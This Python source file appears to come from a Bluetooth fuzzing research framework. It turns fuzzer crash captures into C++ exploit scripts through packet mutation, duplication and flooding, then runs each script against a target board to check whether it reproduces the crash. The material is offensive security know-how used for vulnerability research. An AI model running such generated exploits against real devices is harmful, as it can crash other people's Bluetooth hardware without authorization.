import json
import os
import subprocess
import time
from itertools import combinations
from string import Template

from capture_process import (
    BoardType,
    Capture,
    Crash,
    CypressCapture,
    ESP32Capture,
    FuzzedPkt,
    ProtocolType,
)
from utils import (
    ae_logger,
    calc_file_sha256,
    convert_bytes_to_cpp_array,
    find_mutation_loc,
    random_string,
    run_exploit,
)

# TODO: add double check if the exploit is the desired one logic
# TODO: add flooding exploit, maybe need to go back a bit more


class AutoExploiterOld:
    # capture and exploit logic should happen in this class
    def __init__(
        self,
        capture_path: str,
        protocol: ProtocolType,
        board: BoardType,
        *,
        use_cache: bool = True,
        esp32_log_path: str = "",
    ) -> None:
        self.capture: Capture
        if protocol == "bt":
            if board == "esp32":
                self.capture = ESP32Capture(capture_path, esp32_log_path, use_cache)
            elif board == "cypress":
                self.capture = CypressCapture(capture_path, use_cache)
            else:
                ae_logger.error(
                    f"Auto Exploiter currently does not support {board} board."
                )
        elif protocol == "ble":
            # TODO
            if board == "nordic":
                self.capture = 1

        elif protocol == "5g":
            # TODO: to be implemented
            pass
        else:
            ae_logger.error(
                f"Auto Exploiter currently does not support {protocol} protocol."
            )
        self.exploit_suffix = f"{protocol}_{board}_{random_string(4)}"

    def gen_exploit_script(self, trial_pkts: list[FuzzedPkt]):
        wd_filters_declaration = ""
        wd_filters_setup = ""
        wd_filter_registration = ""
        wd_filter_action = ""

        for idx, trial_pkt in enumerate(reversed(trial_pkts)):
            wd_filters_declaration += f"wd_filter_t f{idx+1};\n"
            wd_filters_setup += f"""f{idx+1} = wd_filter("{trial_pkt.filter}");\n    """
            wd_filter_registration += f"wd_register_filter(ctx->wd, f{idx+1});\n    "

            action = ""
            if trial_pkt.type == "mutation":
                mutations = ""
                for mutation in find_mutation_loc(
                    trial_pkt.prev_pkt_bytes, trial_pkt.pkt_bytes
                ):
                    mutations += f"        pkt_buf[{mutation[0]}] = {mutation[1]};\n"
                action = (
                    f"if (wd_read_filter(ctx->wd, f{idx+1}) && counter == {idx})"
                    "\n"
                    "    {"
                    "\n" + mutations + '        wd_log_y("Send mutated packet now");'
                    "\n"
                    f"        counter = {(idx+1)%len(trial_pkts)};"
                    "\n"
                    "        return 1;"
                    "\n"
                    "    }"
                    "\n"
                )
            elif trial_pkt.type == "duplication":
                if self.capture.protocol == "bt":
                    # bluetooth offset 4 + 7, the last byte is checksum which can be ignored
                    payload = trial_pkt.pkt_bytes[4 + 7 : -1]
                else:
                    payload = trial_pkt.pkt_bytes
                    ae_logger.error("Please implement this")
                action = (
                    f"if (wd_read_filter(ctx->wd, f{idx+1}) && counter == {idx})"
                    "\n"
                    "    {"
                    "\n"
                    f"        static uint8_t packet[] = {convert_bytes_to_cpp_array(payload)};"
                    "\n"
                    f"        m_send_packet(ctx, packet, {len(payload)}, 1);"
                    "\n"
                    '        wd_log_y("Sending duplicated packets now!!!");'
                    "\n"
                    f"        counter = {(idx+1)%len(trial_pkts)};"
                    "\n"
                    "    }"
                    "\n    "
                )
            else:
                ae_logger.error(f"Unknown fuzzed packet type: {trial_pkt.type}")

            wd_filter_action += action

        exploit_template = Template(
            open(
                "/home/user/wdissector/modules/auto-exploiter/exploit_templates/exploit_bt.cpp.template",
                "r",
                encoding="utf8",
            ).read()
        )

        return exploit_template.substitute(
            wd_filters_declaration=wd_filters_declaration,
            wd_filters_setup=wd_filters_setup,
            wd_filter_registration=wd_filter_registration,
            wd_filter_action=wd_filter_action,
        )

    def cause_is_flooding(self, crash: Crash) -> bool:
        """
        Flooding exploit script is different from duplication and mutation exploit script.
        A crash might be caused by flooding if there are many identical packets before it
        that are duplicated.
        """
        dup_count = 0
        mut_count = 0
        payload_occurrence: dict[bytes, int] = {}
        for pkt in reversed(crash.fuzzed_pkts):
            if crash.iteration - pkt.iteration > 30:
                break

            if pkt.type == "duplication":
                dup_count += 1
                if self.capture.protocol == "bt":
                    payload_occurrence[pkt.pkt_bytes[4 + 7 : -1]] = (
                        payload_occurrence.get(pkt.pkt_bytes[4 + 7 : -1], 0) + 1
                    )
                else:
                    # TODO: 5g
                    pass
            else:
                mut_count += 1
        print(dup_count, mut_count, crash.loc)
        if dup_count / (mut_count + dup_count) < 0.8:
            return False
        sorted_payload_occurrence = {
            k: v
            for k, v in sorted(
                payload_occurrence.items(), key=lambda item: item[1], reverse=True
            )
        }
        # print(sorted_payload_occurrence)
        return True

    def flooding_exploit_script_generator(self, crash: Crash):
        # TODO: check bt_auto_fuzz_uni_flooding_1649_bt_esp32_0y3w
        for pkt in reversed(crash.fuzzed_pkts):
            if pkt.type == "mutation":
                continue
            if crash.iteration - pkt.iteration > 30:
                continue
            if pkt.state == "TX / LMP / LMP_detach":
                continue
            exploit_script_name = (
                f"bt_auto_fuzz_uni_flooding_{pkt.loc}_{self.exploit_suffix}"
            )
            exploit_path = f"/home/user/wdissector2/modules/exploits/bluetooth/{exploit_script_name}.cpp"

            with open(exploit_path, "w", encoding="utf8") as f:
                exploit_template = Template(
                    open(
                        "/home/user/wdissector/modules/auto-exploiter/exploit_templates/exploit_bt_flooding.cpp.template",
                        "r",
                        encoding="utf8",
                    ).read()
                )

                f.write(
                    exploit_template.substitute(
                        flooding_pkt=convert_bytes_to_cpp_array(
                            pkt.pkt_bytes[4 + 7 : -1]
                        )
                    )
                )
            yield exploit_script_name, exploit_path

    def exploit_script_generator(
        self,
        same_crashes: list[Crash],
        exploit_max_fuzzed_pkts: int,
        min_trial_pkts: int,
        max_trial_iter: int,
        max_trial_time: int,
    ):
        # Traverse in reverse because we want to try exploits from the packets that are
        # closest to the crash, but no need to try too far packets.
        # Example for packets range defined by max_trial_iter
        # packet:          (i-2)-th iteration
        # packet:          (i-2)-th iteration
        # packet:          (i-1)-th iteration      -------\
        # packet:          (i-1)-th iteration             |
        # packet:          i-th iteration                 | >> max_trial_iter = 2
        # packet:          i-th iteration                 |
        # crash happens at i-th iteration          -------/
        # Sometimes the crash happens in a completely new iteration where no fuzzed packets are inside.
        # In this scenario, problem will arise if num_iterations_to_try is set to 1, i.e. trial_packets
        # is empty. Intuitively, the fuzzed packets in the previous iterations must have caused the
        # crash. Thus, trial_pkts needs to contain a minimum amount of packets.
        # TODO: min_trial_pkts might not be enough, as trial_pkts may need to include all packets from
        # previous iteration in the scenario mentioned above.
        # What if trial_pkts contain too many packets?

        # time limit is for the whole group of crashes of the same kind
        start_time = time.time()
        for crash in same_crashes:
            # if not self.cause_is_flooding(crash):
            #     print("test2", crash.loc)
            # continue
            if self.cause_is_flooding(crash):
                for i, j in self.flooding_exploit_script_generator(crash):
                    yield i, j
            # continue
            trial_pkts: list[FuzzedPkt] = []
            for fuzzed_pkt in reversed(crash.fuzzed_pkts):
                if len(trial_pkts) > min_trial_pkts and (
                    crash.iteration - fuzzed_pkt.iteration >= max_trial_iter
                ):
                    break
                trial_pkts.append(fuzzed_pkt)

            for num_fuzzed_pkts in range(1, exploit_max_fuzzed_pkts + 1):
                for comb in combinations(range(len(trial_pkts)), num_fuzzed_pkts):
                    if time.time() - start_time > max_trial_time:
                        ae_logger.error(
                            f"Maximum trial time has reached for crash located at {crash.loc}."
                        )
                        return

                    selected_trial_pkts = [trial_pkts[i] for i in comb]
                    exploit_script_name = f"bt_auto_fuzz_uni_{ '_'.join([str(i.loc) for i in selected_trial_pkts ]) }_w{num_fuzzed_pkts}_{self.exploit_suffix}"
                    exploit_script = self.gen_exploit_script(selected_trial_pkts)
                    exploit_path = f"/home/user/wdissector2/modules/exploits/bluetooth/{exploit_script_name}.cpp"
                    with open(
                        exploit_path,
                        "w",
                        encoding="utf8",
                    ) as f:
                        f.write(exploit_script)
                    # time.sleep(1)  # for some reason, wait 1 second here
                    yield exploit_script_name, exploit_path

    def verify_exploit(
        self,
        desired_crash_id,
        exploit,
        modem_timeout,
        exploit_timeout,
        exploit_running_dir,
        host_port,
        target,
        target_port,
        target_hub_port,
        log_path,
        same_crash_thresh,
    ):
        # Verify if the exploit can REALLY generate the desired_crash_id
        # because the crash sometimes can be random
        # TODO
        ae_logger.info(f"Verifying {exploit}...")
        run_exploit(
            exploit,
            modem_timeout,
            exploit_timeout,
            exploit_running_dir,
            host_port,
            target,
            target_port,
            target_hub_port,
            log_path,
        )
        exploit_crash_id = self.capture.find_crash_identifier_from_run_log(log_path)

        res = self.capture.is_same_crash_id(
            desired_crash_id, exploit_crash_id, same_crash_thresh
        )

        ae_logger.info(f"Verify result: {res}")
        return res

    def auto_exploit(
        self,
        same_crash_thresh: int,
        exploit_max_fuzzed_pkts: int,
        min_trial_pkts: int,
        max_trial_iter: int,
        max_trial_time: int,
        modem_timeout: int,
        exploit_timeout: int,
        *,
        exploit_running_dir: str,
        host_port: str,
        target: str,
        target_port: str,
        target_hub_port: int,
    ):
        start_time = time.time()
        self.capture.discover_capture_crashes()
        if len(self.capture.crashes) == 0:
            ae_logger.info(f"No crash found in capture: {self.capture.path}.")
            return
        grouped_crashes = self.capture.group_crashes(same_crash_thresh)
        ae_logger.info(
            f"Discovered {len(self.capture.crashes)} crashes, {len(grouped_crashes)} among them are unique."
        )

        for i in self.capture.crashes:
            if i.identifier == "not_found":
                ae_logger.debug(f"No identifier found for crash at {i.loc}.")

        # {hash: (identifier,path)}
        exploit_result: dict[str, tuple[str | None, str]] = {}
        for same_crashes in grouped_crashes:
            # if same_crashes[0].loc != 30653:
            #     logger.info("Skipped non 30653")
            #     continue
            # check if previous crash identifiers meet the current one
            crash_found = False
            for i in exploit_result.values():
                identifier, path = i
                if identifier is None:
                    continue
                if self.capture.is_same_crash_id(
                    identifier, same_crashes[0].identifier, same_crash_thresh
                ):
                    if self.verify_exploit(
                        identifier,
                        path.split("/")[-1].replace("cpp", ""),
                        modem_timeout,
                        exploit_timeout,
                        exploit_running_dir,
                        host_port,
                        target,
                        target_port,
                        target_hub_port,
                        "/home/user/wdissector/modules/auto-exploiter/logs/bluetooth/auto_exploiter_verify.log",
                        same_crash_thresh,
                    ):
                        ae_logger.info(
                            f"Same crash triggered for crashes {[item.loc for item in same_crashes]} using {path}."
                        )
                        crash_found = True
                        break
            if crash_found:
                continue

            ae_logger.info(
                f"Trying to reproduce crash {[i.loc for i in same_crashes]} with identifier: {same_crashes[0].identifier}"
            )
            for exploit, exploit_path in self.exploit_script_generator(
                same_crashes,
                exploit_max_fuzzed_pkts,
                min_trial_pkts,
                max_trial_iter,
                max_trial_time,
            ):
                print(exploit, exploit_path)
                # input("wait")
                # continue
                log_path = f"/home/user/wdissector/modules/auto-exploiter/logs/bluetooth/{exploit}.log"
                if exploit_result.get(calc_file_sha256(exploit_path)) is not None:
                    # TODO: it is confusing here
                    exploit_crash_id, prev_exploit_path = exploit_result[
                        calc_file_sha256(exploit_path)
                    ]
                    os.remove(exploit_path)
                    ae_logger.info(f"Skip duplicate exploit script: {exploit_path}")
                    if exploit_crash_id is not None and self.capture.is_same_crash_id(
                        exploit_crash_id, same_crashes[0].identifier, same_crash_thresh
                    ):
                        if self.verify_exploit(
                            exploit_crash_id,
                            exploit,
                            modem_timeout,
                            exploit_timeout,
                            exploit_running_dir,
                            host_port,
                            target,
                            target_port,
                            target_hub_port,
                            log_path,
                            same_crash_thresh,
                        ):
                            ae_logger.info(
                                f"Success! Same crash triggered for crashes {[item.loc for item in same_crashes]} using {prev_exploit_path}."
                            )
                            break
                    continue
                run_exploit(
                    exploit,
                    modem_timeout,
                    exploit_timeout,
                    exploit_running_dir,
                    host_port,
                    target,
                    target_port,
                    target_hub_port,
                    log_path,
                )
                exploit_crash_id = self.capture.find_crash_identifier_from_run_log(
                    log_path
                )
                exploit_result[calc_file_sha256(exploit_path)] = (
                    exploit_crash_id,
                    exploit_path,
                )
                if exploit_crash_id is None:
                    # os.remove(exploit_path)
                    # os.remove(exploit_path.replace(".cpp", ".so"))
                    # os.remove(exploit_path.replace(".cpp", ".o"))
                    pass
                ae_logger.info(f"{exploit} generates crash: {exploit_crash_id}")

                # TODO: should always use same_crashes[0].reason ?
                if exploit_crash_id is not None and self.capture.is_same_crash_id(
                    exploit_crash_id, same_crashes[0].identifier, same_crash_thresh
                ):
                    if self.verify_exploit(
                        exploit_crash_id,
                        exploit,
                        modem_timeout,
                        exploit_timeout,
                        exploit_running_dir,
                        host_port,
                        target,
                        target_port,
                        target_hub_port,
                        log_path,
                        same_crash_thresh,
                    ):
                        ae_logger.info(
                            f"Same crash triggered for crashes {[item.loc for item in same_crashes]} using {exploit_path}."
                        )
                        break
                else:
                    ae_logger.info(f"{exploit_path} doesn't produce desired crash.")

        ae_logger.info(f"Auto exploiter takes {time.time() - start_time:.3f} seconds.")
